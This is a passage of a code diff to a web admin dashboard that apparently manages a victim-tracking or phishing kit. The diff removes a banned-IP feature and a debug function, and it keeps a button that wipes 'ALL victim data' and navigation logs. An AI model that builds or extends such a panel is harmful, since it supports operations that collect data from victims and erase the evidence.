-                    checkSiteStatus();
-                }
-            });
-        }
         // Clear All Logs Function
         document.getElementById('clearAllLogs').addEventListener('click', function() {
-            if (confirm('🚨 ARE YOU SURE?\n\nThis will delete ALL victim data, navigation logs, and banned IPs!\n\nThis action cannot be undone!')) {
+            if (confirm('🚨 ARE YOU SURE?\n\nThis will delete ALL victim data and navigation logs!\n\nThis action cannot be undone!')) {
                 const button = this;
                 const originalText = button.innerHTML;
         
@@ -2256,7 +1540,7 @@ input:checked + .slider:before {
                         document.getElementById('clearLogsMessage').innerHTML = 
                             '<div class="alert alert-success">✅ All logs cleared successfully! Refreshing...</div>';
                 
-                // Refresh the victims list and banned IPs
+                // Refresh the victims list
                         setTimeout(() => {
                             location.reload();
                         }, 2000);
@@ -2276,42 +1560,15 @@ input:checked + .slider:before {
                 });
             }
         });
-        // Start everything when page loads
-        document.addEventListener('DOMContentLoaded', initialize);
 
-        // Temporary debug function
-        async function debugBannedIps() {
-            try {
-                console.log('🔍 Debug: Testing banned IPs endpoint...');
-                const response = await fetch('/api/get-banned-ips');
-                const text = await response.text();
-                console.log('🔍 Response status:', response.status);
-                console.log('🔍 Response headers:', response.headers);
-                console.log('🔍 First 200 chars of response:', text.substring(0, 200));
-                console.log('🔍 Full response length:', text.length);
-        
-        // Check if it's HTML
-                if (text.includes('<!DOCTYPE') || text.includes('<html')) {
-                    console.log('🔍 Response is HTML, not JSON');
-                    if (text.includes('login') || text.includes('Login')) {
-                        console.log('🔍 Looks like a login page - authentication issue');
-                    }
-                }
-        
-        // Try to parse as JSON anyway
-                try {
-                    const data = JSON.parse(text);
-                    console.log('🔍 Successfully parsed as JSON:', data);
-                } catch (e) {
-                    console.log('🔍 Could not parse as JSON:', e.message);
-                }
-            } catch (error) {
-                console.error('🔍 Debug request failed:', error);
-            }
+        // Initialize
+        function initialize() {
+            loadVictims();
+            startRefreshTimer();
         }
 
-// Call this temporarily
-        setTimeout(debugBannedIps, 1000);
+        // Start everything when page loads
+        document.addEventListener('DOMContentLoaded', initialize);
         </script>
         <script>
 function logout() {
